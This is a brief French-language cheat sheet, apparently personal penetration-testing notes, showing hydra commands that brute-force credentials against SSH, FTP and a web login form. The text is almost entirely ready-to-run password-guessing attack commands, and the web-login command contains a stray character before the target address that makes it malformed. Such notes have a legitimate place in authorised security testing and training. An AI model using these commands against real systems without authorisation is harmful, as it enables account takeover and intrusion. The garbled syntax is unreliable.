hydra est un outil utilisé pour bruteforce des mots de passe et utilisateurs. 
Pour SSH:
```bash
hydra -l 'target_user' -P /path/to/wordlis.txt ssh://'target_ip'
```
Pour ftp:
```bash
hydra -L users.txt -P passwords.txt ftp://'target_ip' -t 4
```
Pour login web:
```bash 
hydra -l admin -P passwords.txt 1'target_ip' http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid username or password"
```
